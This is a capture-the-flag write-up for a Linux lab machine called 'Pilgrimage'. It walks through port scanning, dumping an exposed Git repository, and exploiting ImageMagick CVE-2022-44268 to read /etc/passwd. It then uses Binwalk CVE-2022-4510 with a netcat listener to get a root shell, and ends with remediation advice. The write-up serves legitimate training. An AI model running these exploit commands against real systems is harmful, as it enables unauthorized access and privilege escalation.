## General Information
- Machine: Pilgrimage
- Difficulty: Easy
- OS: Linux
- Date: 15/07/2023


## Methodology
- Reconnaissance: The execution of network scanning using nmap allowed the identification of services running on open ports
- Exploration: 
    - Manipulation of files and directories, such as downloading the Git repository using git-dumperindex.php and exploring the /shrunk directory, was performed. 
    - The identified vulnerabilities, such as CVE-2022-44268 and CVE-2022-4510, were exploited to gain unauthorized access and escalate privileges.
    - Detailed hexadecimal analysis of files, such as using the "identify -verbose" command and decoding with CyberChef, was performed to extract hidden information.
- Results Analysis:Documentation of findings, identification of vulnerabilities, and recommendations for remediation.


## Results
During the port scan, two open ports (SSH and HTTP) were discovered, including an HTTP-based Git repository. The repository was downloaded using git-dumperindex.php. A vulnerability (CVE-2022-44268) in ImageMagick was identified, enabling arbitrary file reading on the website. Exploiting this vulnerability provided access to system files, revealing the username "Emily" and her SSH password. Within the system, the "userflag.txt" file was found. Additionally, a vulnerability (CVE-2022-4510) in Binwalk v2.3.2 was detected, allowing for privilege escalation to root. By exploiting this vulnerability, it was possible to obtain access to the root.txt file.

### Reconnaissance
- 10.10.11.219
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
- http-git: 10.10.11.219:80/.git/


- Port Scan results:

| Port     | State | Service      | Version         |
|----------|-------|--------------|-----------------|   
| 22/tcp   | open  | ssh          | OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) |
| 80/tc    | open  | http | nginx 1.18.0 |


### Commands and analyzes used

#### Nmap
~~~nmap
nmap -sV -sC 10.10.11.219 -oN nmap-scan.txt
~~~

#### git-dumper
~~~git-dumper
python3 git_dumper.py http://pilgrimage.htb/.git/ git 
~~~

#### script-CVE-2022-44268
~~~CVE-2022-44268
python3 generate.py -f  "/etc/passwd"  -o exploit.png
~~~

~~~
python3 generate.py -f  "/var/db/pilgrimage"  -o exploit.png 
~~~

#### script-CVE-2022-4510 
~~~
python3 exploit.py photo.jpg <ip> <port>
~~~

### netcat
~~~ 
nc -lvnp <port>
~~~


## Exploited Vulnerabilities
- Exposed Git repository
- CVE-2022-44268, i.e. ImageMagick 7.1.0-49 is vulnerable to Information Disclosure. When it parses a PNG image (e.g., for resize), the resulting image could have embedded the content of an arbitrary remote file (if the ImageMagick binary has permissions to read it).
- CVE-2022-4510: Binwalk v2.3.2 has a vulnerability that allows for remote command execution, enabling privilege escalation.


## Recommendations
- Secure the Git repository: Ensure that the Git repository is not publicly exposed and implement access controls to restrict unauthorized access.
- Patch and update ImageMagick: Upgrade ImageMagick to a patched version that addresses the CVE-2022-44268 vulnerability to prevent information disclosure attacks.
- Patch Binwalk: Update Binwalk to a patched version that resolves the CVE-2022-4510 vulnerability, mitigating the potential for remote command execution and privilege escalation.
- Secure file handling: Implement proper file handling practices, such as validating user input and enforcing file upload restrictions, to prevent the execution of malicious files or unauthorized access to sensitive information.
- User authentication and authorization: Implement strong user authentication mechanisms, including complex passwords and multi-factor authentication, to protect against unauthorized access to user accounts.